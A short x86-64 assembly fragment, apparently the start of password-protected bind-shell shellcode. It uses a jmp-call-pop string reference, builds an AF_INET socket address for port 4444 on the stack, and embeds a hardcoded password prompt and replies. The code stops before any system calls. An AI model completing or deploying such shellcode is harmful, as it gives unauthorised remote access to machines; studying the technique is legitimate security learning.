global _start

section .text

_start:
	mov rbp, rsp ; Set stack base
	jmp _data

_main:
	pop r9 ; Keep strings reference

	; Build a server sockaddr_struct on the stack
	xor rax, rax
	add ax, 2
	shl rax, 16
	add ax, 23569
	shl rax, 32
	push rax
	nop

	

_data:
	call _main
	prompt: db "Speak friend and enter: "
	pass:	db "password", 0xa
	good:	db "Welcome", 0xa
	bad:	db "Wrong", 0xa
	



